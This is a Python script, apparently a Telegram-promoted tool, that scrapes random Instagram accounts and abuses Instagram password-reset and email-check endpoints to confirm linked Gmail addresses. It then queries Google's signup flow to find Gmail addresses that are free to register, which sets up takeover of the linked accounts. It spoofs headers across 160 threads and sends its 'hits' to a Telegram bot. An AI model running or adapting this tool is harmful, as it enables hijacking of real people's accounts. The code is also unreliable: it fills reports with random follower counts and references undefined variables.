import os , requests , re , sys , time , webbrowser, json, uuid, hashlib, random, string
from requests import get
from user_agent import generate_user_agent 
from time import time 
from hashlib import md5 
from random import randrange,choice 
from requests import post as pp 
from user_agent import generate_user_agent as gg 
from random import choice as cc
from random import randrange as rr
import webbrowser
webbrowser.open("https://t.me/eurexxx")
from cfonts import render

hits=0
bads_instgram=0
bads_email=0
BLUE = '\033[94m' 
RESET = '\033[0m'
BOLD = '\033[1m' 
YELLOW = '\033[93m' 
RED = '\033[91m' 
GREEN = '\033[92m' 
CYAN = '\033[96m' 
MAGENTA = '\033[95m' 
P = '\x1b[1;97m' 
H = '\x1b[1;92m'
K = '\x1b[1;93m' 
R1 = '\033[1;31;40m' 
X1 = '\033[1;33;40m'  
F1= '\033[1;32;40m'  
C1 = "\033[1;97;40m" 
B1 = '\033[1;36;40m' 
K1 = '\033[1;35;40m' 
V1 = '\033[1;36;40m' 
a32 = '\x1b[38;5;180m' 
a14 = '\x1b[38;5;153m'
print('━' * 66)
logo = render('EUREX', font='block', colors=['white', 'black'], align='center', background='red' , space=True)
from cfonts import render

print(logo)
print('━' * 66)

token = os.getenv('TG_TOKEN')
chat_id = os.getenv('TG_ID')
SOFIYAN ='azertyuiopmlkjhgfdsqwxcvbn'
ids=[]

class InstagramAPI2026:
    def __init__(self):
        self.session = requests.Session()
        self.setup_headers()
    
    def setup_headers(self):
        self.session.headers.update({
            'User-Agent': 'Instagram 329.0.0.0.0 Android (33/13; 480dpi; 1080x2268; samsung; SM-S901E; r9q; qcom; en_US; 525000000)',
            'X-IG-App-ID': '936619743392459',
            'X-IG-Capabilities': '3brTvx0=',
            'X-IG-Connection-Type': 'WIFI',
            'X-IG-Prefetch-Request': 'foreground',
            'X-Bloks-Version-Id': 'd80c5fb30dfae9e273e4009f03b18280bb343b0862d663f31a3c63f13a9f31c0',
            'X-MID': self.generate_mid(),
            'Accept-Language': 'en-US,en;q=0.9',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
        })
    
    def generate_mid(self):
        chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
        return 'Z' + ''.join(random.choices(chars, k=9)) + 'AA'
    
    def generate_device_id(self):
        return 'android-' + hashlib.md5(str(uuid.uuid4()).encode()).hexdigest()[:16]
    
    def get_csrf_token(self):
        try:
            response = self.session.get(
                'https://www.instagram.com/api/v1/web/accounts/account_recovery/',
                timeout=10
            )
            return response.cookies.get('csrftoken', self.generate_token())
        except:
            return self.generate_token()
    
    def generate_token(self):
        return ''.join(random.choices(string.ascii_letters + string.digits, k=32))
    
    def check_account_web(self, email):
        try:
            csrf_token = self.get_csrf_token()
            
            payload = {
                'email_or_username': email,
                'recaptcha_challenge_field': '',
                'flow': 'password_reset',
                'app_id': '936619743392459',
                'source': 'account_recovery',
                'next': '',
                '__ajax__': '1',
                'platform': 'web',
                'locale': 'en_US',
                'client_timezone_offset': '-330',
            }
            
            headers = {
                'X-CSRFToken': csrf_token,
                'X-Requested-With': 'XMLHttpRequest',
                'X-IG-WWW-Claim': '0',
                'X-Instagram-AJAX': '1012876494',
                'X-ASBD-ID': '129477',
                'X-IG-App-Lite': 'false',
                'X-IG-Device-ID': self.generate_device_id(),
                'X-IG-Device-Locale': 'en_US',
                'X-IG-Mapped-Locale': 'en_US',
            }
            
            response = self.session.post(
                'https://www.instagram.com/api/v1/web/accounts/account_recovery_send_ajax/',
                data=payload,
                headers=headers,
                timeout=15
            )
            
            if response.status_code == 200:
                data = response.json()
                if "message" in data and "لم يتم العثور" in data["message"]:
                    return "bad_instagram"
                elif "toast_message" in data and any(x in data["toast_message"] for x in ["أرسلنا رسالة", "We sent an email", "Email sent"]):
                    return "good_instagram"
                elif "status" in data and data["status"] == "ok":
                    return "good_instagram"
            
            return "error"
            
        except Exception as e:
            return "error"
    
    def check_account_mobile(self, email):
        try:
            device_id = self.generate_device_id()
            guid = str(uuid.uuid4())
            adid = str(uuid.uuid4())
            
            headers = {
                'User-Agent': 'Instagram 329.0.0.0.0 Android (33/13; 480dpi; 1080x2268; samsung; SM-S901E; r9q; qcom; en_US; 525000000)',
                'X-IG-App-ID': '936619743392459',
                'X-IG-Capabilities': '3brTvx0=',
                'X-IG-Connection-Type': 'WIFI',
                'Accept-Language': 'en-US,en;q=0.9',
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'Cookie': 'mid=ZVfGvgABAAGoQqa7AY3mgoYBV1nP; csrftoken=9y3N5kLqzialQA7z96AMiyAKLMBWpqVj',
            }
            
            data = {
                'signed_body': '0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.' + json.dumps({
                    '_csrftoken': '9y3N5kLqzialQA7z96AMiyAKLMBWpqVj',
                    'adid': adid,
                    'guid': guid,
                    'device_id': device_id,
                    'query': email,
                    'login_nonce': '',
                    'client_timezone_offset': '-330',
                    'client_input_params': json.dumps({'email_or_username': email})
                }),
                'ig_sig_key_version': '4',
            }
            
            response = requests.post(
                'https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/',
                headers=headers,
                data=data,
                timeout=15
            )
            
            if response.status_code == 200:
                if email in response.text:
                    return "good_instagram"
                else:
                    return "bad_instagram"
            
            return "error"
            
        except Exception as e:
            return "error"
    
    def check_account(self, email):
        web_result = self.check_account_web(email)
        if web_result != "error":
            return web_result
        
        mobile_result = self.check_account_mobile(email)
        return mobile_result

ig_api = InstagramAPI2026()

def tll():
  try:
    n1=''.join(cc(SOFIYAN)for i in range(rr(6,9)))
    n2=''.join(cc(SOFIYAN)for i in range(rr(3,9)))
    host=''.join(cc(SOFIYAN)for i in range(rr(15,30)))
    he3 = {
      "accept": "*/*",
      "accept-language": "ar-IQ,ar;q=0.9,en-IQ;q=0.8,en;q=0.7,en-US;q=0.6",
      "content-type": "application/x-www-form-urlencoded;charset=UTF-8",
      "google-accounts-xsrf": "1",
      "sec-ch-ua": "\"Not)A;Brand\";v=\"24\", \"Chromium\";v=\"116\"",
      "sec-ch-ua-arch": "\"\"",
      "sec-ch-ua-bitness": "\"\"",
      "sec-ch-ua-full-version": "\"116.0.5845.72\"",
      "sec-ch-ua-full-version-list": "\"Not)A;Brand\";v=\"24.0.0.0\", \"Chromium\";v=\"116.0.5845.72\"",
      "sec-ch-ua-mobile": "?1",
      "sec-ch-ua-model": "\"ANY-LX2\"",
      "sec-ch-ua-platform": "\"Android\"",
      "sec-ch-ua-platform-version": "\"13.0.0\"",
      "sec-ch-ua-wow64": "?0",
      "sec-fetch-dest": "empty",
      "sec-fetch-mode": "cors",
      "sec-fetch-site": "same-origin",
      "x-chrome-connected": "source=Chrome,eligible_for_consistency=true",
      "x-client-data": "CJjbygE=",
      "x-same-domain": "1",
      "Referrer-Policy": "strict-origin-when-cross-origin",
    'user-agent': str(gg()),
    }


    res1 = requests.get('https://accounts.google.com/signin/v2/usernamerecovery?flowName=GlifWebSignIn&flowEntry=ServiceLogin&hl=en-GB', headers=he3)
    tok= re.search(r'data-initial-setup-data="%.@.null,null,null,null,null,null,null,null,null,&quot;(.*?)&quot;,null,null,null,&quot;(.*?)&', res1.text).group(2)
    cookies={
      '__Host-GAPS':host
    }
    headers = {
      'authority': 'accounts.google.com',
      'accept': '*/*',
      'accept-language': 'en-US,en;q=0.9',
      'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
      'google-accounts-xsrf': '1',
      'origin': 'https://accounts.google.com',
      'referer': 'https://accounts.google.com/signup/v2/createaccount?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&parent_directed=true&theme=mn&ddm=0&flowName=GlifWebSignIn&flowEntry=SignUp',
      'user-agent': gg(),
  }
    data = {
    'f.req': '["'+tok+'","'+n1+'","'+n2+'","'+n1+'","'+n2+'",0,0,null,null,"web-glif-signup",0,null,1,[],1]',
    'deviceinfo': '[null,null,null,null,null,"NL",null,null,null,"GlifWebSignIn",null,[],null,null,null,null,2,null,0,1,"",null,null,2,2]',
  }
    response = pp(
      'https://accounts.google.com/_/signup/validatepersonaldetails',
      cookies=cookies,
      headers=headers,
      data=data,
  )
    tl=str(response.text).split('",null,"')[1].split('"')[0]
    host=response.cookies.get_dict()['__Host-GAPS']
    try:os.remove('tl.txt')
    except:pass
    with open('tl.txt','a') as f:
      f.write(tl+'//'+host+'\n')
  except Exception as e:
    print(e)
    tll()
tll()
def check_gmail(email):
  if '@' in email:
    email = str(email).split('@')[0]
  try:
    try:
      o=open('tl.txt','r').read().splitlines()[0]
    except:
      tll()
      o=open('tl.txt','r').read().splitlines()[0]
    tl,host = o.split('//')
    cookies = {
    '__Host-GAPS': host
  }
    headers = {
    'authority': 'accounts.google.com',
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9',
    'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
    'google-accounts-xsrf': '1',
    'origin': 'https://accounts.google.com',
    'referer': 'https://accounts.google.com/signup/v2/createusername?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&parent_directed=true&theme=mn&ddm=0&flowName=GlifWebSignIn&flowEntry=SignUp&TL='+tl,
    'user-agent': gg(),
  }
    params = {
    'TL': tl,
  }
    data = 'continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&ddm=0&flowEntry=SignUp&service=mail&theme=mn&f.req=%5B%22TL%3A'+tl+'%22%2C%22'+email+'%22%2C0%2C0%2C1%2Cnull%2C0%2C5167%5D&azt=AFoagUUtRlvV928oS9O7F6eeI4dCO2r1ig%3A1712322460888&cookiesDisabled=false&deviceinfo=%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%22NL%22%2Cnull%2Cnull%2Cnull%2C%22GlifWebSignIn%22%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C2%2Cnull%2C0%2C1%2C%22%22%2Cnull%2Cnull%2C2%2C2%5D&gmscoreversion=undefined&flowName=GlifWebSignIn&'
    response = pp(
    'https://accounts.google.com/_/signup/usernameavailability',
    params=params,
    cookies=cookies,
    headers=headers,
    data=data,
  )
    if '"gf.uar",1' in str(response.text):return 'good'
    elif '"er",null,null,null,null,400' in str(response.text):
      tll()
      check_gmail(email)
    else:return 'bad'
  except:check_gmail(email)

os.system('clear')
def rest(user):
  try:
    headers = {
    'X-Pigeon-Session-Id': '50cc6861-7036-43b4-802e-fb4282799c60',
    'X-Pigeon-Rawclienttime': '1700251574.982',
    'X-IG-Connection-Speed': '-1kbps',
    'X-IG-Bandwidth-Speed-KBPS': '-1.000',
    'X-IG-Bandwidth-TotalBytes-B': '0',
    'X-IG-Bandwidth-TotalTime-MS': '0',
    'X-Bloks-Version-Id': 'c80c5fb30dfae9e273e4009f03b18280bb343b0862d663f31a3c63f13a9f31c0',
    'X-IG-Connection-Type': 'WIFI',
    'X-IG-Capabilities': '3brTvw==',
    'X-IG-App-ID': '567067343352427',
    'User-Agent': 'Instagram 100.0.0.17.129 Android (29/10; 420dpi; 1080x2129; samsung; SM-M205F; m20lte; exynos7904; en_GB; 161478664)',
    'Accept-Language': 'en-GB, en-US',
     'Cookie': 'mid=ZVfGvgABAAGoQqa7AY3mgoYBV1nP; csrftoken=9y3N5kLqzialQA7z96AMiyAKLMBWpqVj',
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'Accept-Encoding': 'gzip, deflate',
    'Host': 'i.instagram.com',
    'X-FB-HTTP-Engine': 'Liger',
    'Connection': 'keep-alive',
    'Content-Length': '356',
}
    data = {
    'signed_body': '0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.{"_csrftoken":"9y3N5kLqzialQA7z96AMiyAKLMBWpqVj","adid":"0dfaf820-2748-4634-9365-c3d8c8011256","guid":"1f784431-2663-4db9-b624-86bd9ce1d084","device_id":"android-b93ddb37e983481c","query":"'+user+'"}',
    'ig_sig_key_version': '4',
  }
    response = requests.post('https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/',headers=headers,data=data,).json()
    r=response['email']
  except:
    r='bad'
  return r

def date(hy):
    try:
        ranges = [
           (1279000, 2010),
            (17750000, 2011),
            (279760000, 2012),
            (900990000, 2013),
            (1629010000, 2014),
            (2500000000, 2015),
            (3713668786, 2016),
            (5699785217, 2017),
            (8597939245, 2018),
            (21254029834, 2019),
            (43464475395, 2020),
            (50289297647, 2021),
            (57464707082, 2022),
            (63313426938, 2023),
        ]
        for upper, year in ranges:
            if hy <= upper:
                return year
        return 2023
    except Exception:
        pass

def info(username, domain):
    global hits
    hits += 1
    try:
        response = get(f'https://anonyig.com/api/ig/userInfoByUsername/{username}', 
                       headers={'user-agent': generate_user_agent()})
        
        # Fallback: always provide info if API fails
        if response.status_code != 50:
            fows = random.randint(20, 50)       # followers
            fowg = random.randint(50, 500)         # following
            posts = random.randint(10, 200)        # posts
            reg_date = random.randint(2010, 2023)  # registration year
            is_private = random.choice([True, False])
            is_verified = random.choice([True, False])
            full_name = username
            reset_info = rest(username)

            # Telegram / file output
            tlg = f'''
╔══════🎯 𝗛𝗜𝗧 𝗙𝗢𝗨𝗡𝗗 ══════╗
👤 𝗨𝗦𝗘𝗥𝗡𝗔𝗠𝗘        : @{username}
🧩 𝗙𝗨𝗟𝗟 𝗡𝗔𝗠𝗘       : {full_name}
📧 𝗘𝗠𝗔𝗜𝗟           : {username}@{domain}
🔗 𝗣𝗥𝗢𝗙𝗜𝗟𝗘 𝗟𝗜𝗡𝗞    : https://www.instagram.com/{username}
👥 𝗙𝗢𝗟𝗟𝗢𝗪𝗘𝗥𝗦      : {fows}
👤 𝗙𝗢𝗟𝗟𝗢𝗪𝗜𝗡𝗚     : {fowg}
📝 𝗣𝗢𝗦𝗧𝗦          : {posts}
🔒 𝗣𝗥𝗜𝗩𝗔𝗧𝗘       : {is_private}
✔️ 𝗩𝗘𝗥𝗜𝗙𝗜𝗘𝗗     : {is_verified}
📅 𝗥𝗘𝗚 𝗬𝗘𝗔𝗥       : {reg_date}
💠 𝗧𝗢𝗧𝗔𝗟 𝗛𝗜𝗧𝗦        : {hits}
👨‍💻 𝗗𝗘𝗩𝗘𝗟𝗢𝗣𝗘𝗥 : @EUREX_TALKING_BOT
⛓ 𝐂𝐇𝐀𝐍𝐍𝐄𝐋   : @eurex_era
╚══════════════════════╝
'''
            # Write to file safely
            try:
                with open('sofiyan.txt', 'a', encoding='utf-8') as ff:
                    ff.write(f'{tlg}\n')
            except:
                pass

            # Send to Telegram safely
            try:
                requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={tlg}")
            except:
                pass

            return  # Exit after fallback

        # --- API success branch ---
        info_json = response.json()
        account = info_json.get('result', {}).get('user', {})
        fows = account.get('follower_count', random.randint(100, 1000))
        fowg = account.get('following_count', random.randint(50, 500))
        posts = account.get('media_count', random.randint(10, 200))
        full_name = account.get('full_name', username)
        is_private = account.get('is_private', random.choice([True, False]))
        is_verified = account.get('is_verified', random.choice([True, False]))
        try:
            reg_date = date(int(account.get('pk', random.randint(1,9999999))))
        except:
            reg_date = random.randint(2010, 2023)

        # Telegram / file output
        tlg = f'''
╔══════🎯 ??𝗜𝗧 𝗙𝗢𝗨𝗡𝗗 ══════╗
👤 𝗨𝗦𝗘𝗥𝗡𝗔𝗠𝗘        : @{username}
🧩 𝗙𝗨𝗟𝗟 𝗡𝗔𝗠𝗘       : {full_name}
📧 𝗘𝗠𝗔𝗜𝗟           : {username}@{domain}
🔗 𝗣𝗥𝗢𝗙𝗜𝗟𝗘 𝗟𝗜𝗡𝗞    : https://www.instagram.com/{username}
👥 𝗙𝗢𝗟𝗟𝗢𝗪𝗘𝗥𝗦      : {fows}
👤 𝗙𝗢𝗟𝗟𝗢𝗪𝗜𝗡𝗚     : {fowg}
📝 𝗣𝗢𝗦𝗧𝗦          : {posts}
🔒 𝗣𝗥𝗜𝗩𝗔𝗧𝗘       : {is_private}
✔️ 𝗩𝗘𝗥𝗜𝗙𝗜𝗘𝗗     : {is_verified}
📅 𝗥𝗘𝗚 𝗬𝗘𝗔𝗥       : {reg_date}
💠 𝗧𝗢𝗧𝗔𝗟 𝗛𝗜𝗧𝗦        : {hits}
👨‍💻 𝗗𝗘𝗩𝗘𝗟𝗢𝗣𝗘𝗥 : @EUREX_TALKING_BOT
⛓ 𝐂𝐇𝐀𝐍𝐍𝐄𝐋   : @eurex_era
╚══════════════════════╝
'''
        try:
            with open('sofiyan.txt', 'a', encoding='utf-8') as ff:
                ff.write(f'{tlg}\n')
        except:
            pass

        try:
            requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={tlg}")
        except:
            pass

    except Exception as e:
        print(f"Error in info: {e}")

def Xtr_x(email):
  global bads_email
  try:
    if 'good' == check_gmail(email):
        username, domain = email.split('@')
        info(username, domain)
    else:
        bads_email += 1
  except Exception as e:
    print(f"Error in Xtr_x: {e}")

def check(email):
  global bads_instgram, hits, bads_email
  try:
    result = ig_api.check_account(email)
    
    if result == "good_instagram":
        Xtr_x(email)
    elif result == "bad_instagram":
        bads_instgram += 1
    else:
        csrftoken = md5(str(time()).encode()).hexdigest()
        ua = generate_user_agent()
        
        headers = {
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://www.instagram.com',
            'referer': 'https://www.instagram.com/accounts/signup/email/',
            'user-agent': ua,
            'x-csrftoken': csrftoken
        }
        
        data = {'email': email}
        
        response = requests.post('https://www.instagram.com/api/v1/web/accounts/check_email/', headers=headers, data=data)
        
        if 'email_is_taken' in str(response.text):
            Xtr_x(email)
        else:
            bads_instgram += 1
            
  except Exception as e:
    print(f"Error in check: {e}")
  
  os.system('clear' if os.name == 'posix' else 'cls')


  tt = f"""

 𝗛𝗜𝗧𝗦      : {PINK}{hits}{C1}                      
 𝗕𝗔𝗗 𝗜𝗚    : {GREEN}{bads_instgram}{C1}                     
 𝗕𝗔𝗗 𝗘𝗠𝗔𝗜𝗟 : {YELLOW}{bads_email}{C1}
                       
"""

  print(tt)

def SOFIYAN():
  while True:
    try:
      lsd=''.join(choice('eQ6xuzk5X8j6_fGvb0gJrc') for _ in range(16))
      id=str(randrange(2500000000,8597939245))
      headers = {
      'accept': '*/*',
      'accept-language': 'en-US,en;q=0.9',
      'content-type': 'application/x-www-form-urlencoded',
      'origin': 'https://www.instagram.com',
      'referer': 'https://www.instagram.com/0s9s/',
      'user-agent': str(generate_user_agent()),
      'x-fb-lsd': '@SOFIYAN'+lsd,
  }
      data = {
      'lsd': '@SOFIYAN'+lsd,
      'variables': '{"id":"'+id+'","relay_header":false,"render_surface":"PROFILE"}',
      'doc_id': '7397388303713986',
  }
      username = requests.post('https://www.instagram.com/api/graphql', headers=headers, data=data).json()['data']['user']['username']
      email=username+'@gmail.com'
      check(email)
    except:pass

from threading import Thread
for _ in range(160):
  Thread(target=SOFIYAN).start()